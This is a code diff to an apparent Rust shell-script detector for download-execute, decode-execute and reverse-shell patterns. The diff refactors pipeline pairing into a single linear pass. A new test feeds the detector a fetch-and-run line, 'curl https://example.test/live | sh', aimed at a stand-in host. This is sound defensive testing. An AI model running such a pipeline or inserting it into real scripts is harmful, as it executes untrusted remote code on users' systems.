@@ -4,17 +4,19 @@
 //! families — fetch-to-interpreter and decoder-to-interpreter pipelines,
 //! consumed substitution spans, reverse-shell spellings, and the shared
 //! temporary-path rules — with per-line finding deduplication.
+#[cfg(test)]
+use super::budget::MAX_SHELL_ANALYSIS_NODES;
 use super::budget::{CachedFindingSummary, ShellBudget};
 use super::command::{
     redirect_moves_stdin_away, segment_commands, skip_command_prefixes, statement_outcomes,
 };
 use super::effects::{
-    StdoutEffect, body_live_fetch_stdout, command_decodes, command_fetches, ir_command_decodes,
-    ir_command_depends_on_inherited_stdin, ir_command_effects, ir_node_reaches_interpreter,
-    ir_node_stdout_preserved, pipeline_has_live_producer, segment_has_live_producer,
-    segment_stdin_reaches_interpreter, stdout_reaches,
+    CommandEffects, ExecutionEffect, StdoutEffect, body_live_fetch_stdout, command_decodes,
+    command_fetches, ir_command_decodes, ir_command_depends_on_inherited_stdin, ir_command_effects,
+    ir_node_reaches_interpreter, ir_node_stdout_preserved, pipeline_has_live_producer,
+    segment_has_live_producer, segment_stdin_reaches_interpreter, stdout_reaches,
 };
-use super::egress::node_has_live_fetch_stdout;
+use super::egress::{node_has_live_fetch_stdout, node_has_live_fetch_stdout_with_effects};
 use super::indicators::{
     chmod_relaxes_shared_temp, reverse_shell_spelling, segment_has_shared_temp_path,
 };
@@ -47,8 +49,9 @@ pub(in crate::detect) fn shell_consumption_findings(
     }
     // The typed path owns direct command, compound, and available child
     // reachability. The token walk below remains as a bounded compatibility
-    // fallback for unsupported or depth-capped nested text.
-    if shell_unit.is_some_and(|unit| typed_fetch_reaches_interpreter(unit, budget)) {
+    // fallback only when an opaque or depth-capped child requires it.
+    let typed_pairing = shell_unit.map(|unit| typed_unit_pairing(unit, budget));
+    if typed_pairing.is_some_and(|pairing| pairing.0) {
         push_finding(
             found,
             parts(
@@ -59,7 +62,7 @@ pub(in crate::detect) fn shell_consumption_findings(
             ),
         );
     }
-    if shell_unit.is_some_and(|unit| typed_decoder_reaches_interpreter(unit, budget)) {
+    if typed_pairing.is_some_and(|pairing| pairing.1) {
         push_finding(
             found,
             parts(
@@ -77,6 +80,7 @@ pub(in crate::detect) fn shell_consumption_findings(
             push_finding(found, finding);
         }
     }
+    let use_legacy_pairing = shell_unit.is_none() || typed_pairing.is_some_and(|pairing| pairing.2);
     let mut outcomes = Outcomes::ANY;
     for (statement, guard) in conditional_statements(tokens) {
         if statement.is_empty() {
@@ -94,7 +98,7 @@ pub(in crate::detect) fn shell_consumption_findings(
 
         // Download-execute: a fetch-tool command feeding an interpreter
         // through the pipeline, or heading a consumed span.
-        if pipeline_fetches_to_interpreter(statement, budget)
+        if (use_legacy_pairing && pipeline_fetches_to_interpreter(statement, budget))
             || consumed
                 .iter()
                 .any(|span| span_has_fetch_command(span, budget))
@@ -112,7 +116,7 @@ pub(in crate::detect) fn shell_consumption_findings(
 
         // Decode-execute: a decoder command feeding an interpreter through
         // the pipeline, or heading a consumed span.
-        if pipeline_decodes_to_interpreter(statement, budget)
+        if (use_legacy_pairing && pipeline_decodes_to_interpreter(statement, budget))
             || consumed
                 .iter()
                 .any(|span| span_executes_decoder(span, budget))
@@ -398,22 +402,37 @@ fn cached_program_consumption_findings(
 /// Direct fetch-to-interpreter pairing over the typed shell IR, including
 /// live output from a static child body. Depth-capped children stay on the
 /// bounded token fallback.
+#[cfg(test)]
 fn typed_fetch_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
-    unit.statements
-        .iter()
-        .filter(|statement| statement.reachable)
-        .flat_map(|statement| statement.pipelines.iter())
-        .any(|pipeline| {
-            typed_pipeline_reaches_interpreter(pipeline, budget, typed_node_has_live_fetch)
-        })
+    typed_unit_pairing(unit, budget).0
 }
 
+#[cfg(test)]
 fn typed_decoder_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
-    unit.statements
+    typed_unit_pairing(unit, budget).1
+}
+
+/// The complete typed pairing result for one logical unit. The same node
+/// summary drives both producer channels, while the fallback bit tells the
+/// caller whether legacy token handling is needed for an opaque/depth-capped
+/// child.
+fn typed_unit_pairing(unit: &LogicalUnit, budget: &mut ShellBudget) -> (bool, bool, bool) {
+    let mut download_execute = false;
+    let mut decode_execute = false;
+    let mut needs_legacy_fallback = false;
+    for statement in unit
+        .statements
         .iter()
         .filter(|statement| statement.reachable)
-        .flat_map(|statement| statement.pipelines.iter())
-        .any(|pipeline| typed_decoder_pipeline_reaches_interpreter(pipeline, budget))
+    {
+        for pipeline in &statement.pipelines {
+            let (download, decode, fallback) = typed_pipeline_pairing(pipeline, budget);
+            download_execute |= download;
+            decode_execute |= decode;
+            needs_legacy_fallback |= fallback;
+        }
+    }
+    (download_execute, decode_execute, needs_legacy_fallback)
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -429,63 +448,102 @@ impl DecoderOutput {
     };
 }
 
-fn typed_decoder_pipeline_reaches_interpreter(
+fn typed_pipeline_pairing(
     pipeline: &super::ir::Pipeline,
     budget: &mut ShellBudget,
-) -> bool {
-    for consumer in 1..pipeline.commands.len() {
-        if !ir_node_reaches_interpreter(&pipeline.commands[consumer], budget) {
-            continue;
+) -> (bool, bool, bool) {
+    let mut live_fetch = false;
+    let mut live_decoder = false;
+    let mut download_execute = false;
+    let mut decode_execute = false;
+    let mut needs_legacy_fallback = false;
+
+    for node in &pipeline.commands {
+        let summary = summarize_node_once(node, budget);
+        needs_legacy_fallback |= summary.needs_legacy_fallback;
+        if summary.executes_stdin {
+            download_execute |= live_fetch;
+            decode_execute |= live_decoder;
         }
-        for producer in 0..consumer {
-            let output = typed_node_decoder_output(&pipeline.commands[producer], budget);
-            if output.reaches_stdout
-                && pipeline.commands[producer + 1..consumer]
-                    .iter()
-                    .all(|node| ir_node_stdout_preserved(node, budget))
-            {
-                return true;
-            }
-        }
+        live_fetch = summary.produces_fetch || (live_fetch && summary.forwards_stdin);
+        live_decoder = summary.produces_decoder || (live_decoder && summary.forwards_stdin);
     }
-    false
+    (download_execute, decode_execute, needs_legacy_fallback)
 }
 
-fn typed_pipeline_reaches_interpreter(
-    pipeline: &super::ir::Pipeline,
-    budget: &mut ShellBudget,
-    producer_predicate: fn(&CommandNode, &mut ShellBudget) -> bool,
-) -> bool {
-    for consumer in 1..pipeline.commands.len() {
-        if !ir_node_reaches_interpreter(&pipeline.commands[consumer], budget) {
-            continue;
-        }
-        for producer in 0..consumer {
-            if !producer_predicate(&pipeline.commands[producer], budget) {
-                continue;
-            }
-            if pipeline.commands[producer + 1..consumer]
-                .iter()
-                .all(|node| ir_node_stdout_preserved(node, budget))
-            {
-                return true;
-            }
-        }
-    }
-    false
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+struct NodeSummary {
+    executes_stdin: bool,
+    forwards_stdin: bool,
+    produces_fetch: bool,
+    produces_decoder: bool,
+    needs_legacy_fallback: bool,
 }
 
-fn typed_node_has_live_fetch(node: &CommandNode, budget: &mut ShellBudget) -> bool {
-    if !node_has_live_fetch_stdout(node, budget) {
-        return false;
-    }
-    true
-}
-
-fn typed_node_decoder_output(node: &CommandNode, budget: &mut ShellBudget) -> DecoderOutput {
+fn summarize_node_once(node: &CommandNode, budget: &mut ShellBudget) -> NodeSummary {
     match node {
         CommandNode::Simple(command) => {
             let effects = ir_command_effects(command, budget);
+            let needs_legacy_fallback = command
+                .body
+                .as_ref()
+                .is_some_and(|body| body.program.is_none())
+                || command.args.iter().any(|word| {
+                    word.substitutions.iter().any(|substitution| {
+                        matches!(
+                            substitution.kind,
+                            super::lexer::SubstKind::Command | super::lexer::SubstKind::Process
+                        ) && substitution.program.is_none()
+                    })
+                });
+            NodeSummary {
+                executes_stdin: matches!(
+                    effects.execution,
+                    ExecutionEffect::ExecutesStdin | ExecutionEffect::ExecutesTaintedArgument
+                ),
+                forwards_stdin: effects.stdout == StdoutEffect::ForwardedInput,
+                produces_fetch: node_has_live_fetch_stdout_with_effects(
+                    node,
+                    budget,
+                    Some(effects),
+                ),
+                produces_decoder: typed_node_decoder_output(node, budget, Some(effects))
+                    .reaches_stdout,
+                needs_legacy_fallback,
+            }
+        }
+        CommandNode::Subshell { .. } | CommandNode::BraceGroup { .. } => NodeSummary {
+            executes_stdin: ir_node_reaches_interpreter(node, budget),
+            forwards_stdin: ir_node_stdout_preserved(node, budget),
+            produces_fetch: node_has_live_fetch_stdout(node, budget),
+            produces_decoder: false,
+            needs_legacy_fallback: false,
+        },
+        CommandNode::Arithmetic { .. } | CommandNode::ControlFlow { .. } => NodeSummary {
+            executes_stdin: false,
+            forwards_stdin: false,
+            produces_fetch: false,
+            produces_decoder: false,
+            needs_legacy_fallback: true,
+        },
+        CommandNode::Opaque { .. } => NodeSummary {
+            executes_stdin: false,
+            forwards_stdin: false,
+            produces_fetch: false,
+            produces_decoder: false,
+            needs_legacy_fallback: true,
+        },
+    }
+}
+
+fn typed_node_decoder_output(
+    node: &CommandNode,
+    budget: &mut ShellBudget,
+    supplied_effects: Option<CommandEffects>,
+) -> DecoderOutput {
+    match node {
+        CommandNode::Simple(command) => {
+            let effects = supplied_effects.unwrap_or_else(|| ir_command_effects(command, budget));
             if ir_command_decodes(command) {
                 let depends_on_inherited_stdin =
                     ir_command_depends_on_inherited_stdin(command, budget);
@@ -548,7 +606,8 @@ fn typed_program_decoder_output(program: &ShellProgram, budget: &mut ShellBudget
         {
             for pipeline in &statement.pipelines {
                 for producer in 0..pipeline.commands.len() {
-                    let output = typed_node_decoder_output(&pipeline.commands[producer], budget);
+                    let output =
+                        typed_node_decoder_output(&pipeline.commands[producer], budget, None);
                     if output.reaches_stdout
                         && pipeline.commands[producer + 1..]
                             .iter()
@@ -981,6 +1040,40 @@ mod tests {
                 &mut budget,
             )
             .is_empty()
+        );
+    }
+
+    #[test]
+    fn typed_pipeline_work_is_linear_and_keeps_later_compounds_live() {
+        let benign = std::iter::repeat_n("cat", 1_001)
+            .collect::<Vec<_>>()
+            .join(" | ");
+        let source = format!("{benign}; (curl https://example.test/live | sh)");
+        let program = ShellProgram::from_units(vec![(1, source)]);
+        let unit = &program.units()[0];
+        let mut budget = ShellBudget::new();
+        let mut found = Vec::new();
+        shell_consumption_findings(
+            unit.tokens(),
+            Some(unit),
+            1,
+            SCRIPT_DOWNLOAD_EXECUTE_RULE,
+            &mut found,
+            &mut budget,
+        );
+
+        assert!(!budget.exhausted());
+        assert!(
+            found
+                .iter()
+                .any(|finding| finding.semantic_value == "download-execute")
+        );
+        let consumed = MAX_SHELL_ANALYSIS_NODES - budget.nodes;
+        assert!(
+            consumed <= unit.tokens().len() as u32 * 8,
+            "typed work should stay within a small linear bound: {} nodes for {} tokens",
+            consumed,
+            unit.tokens().len()
         );
     }
 }
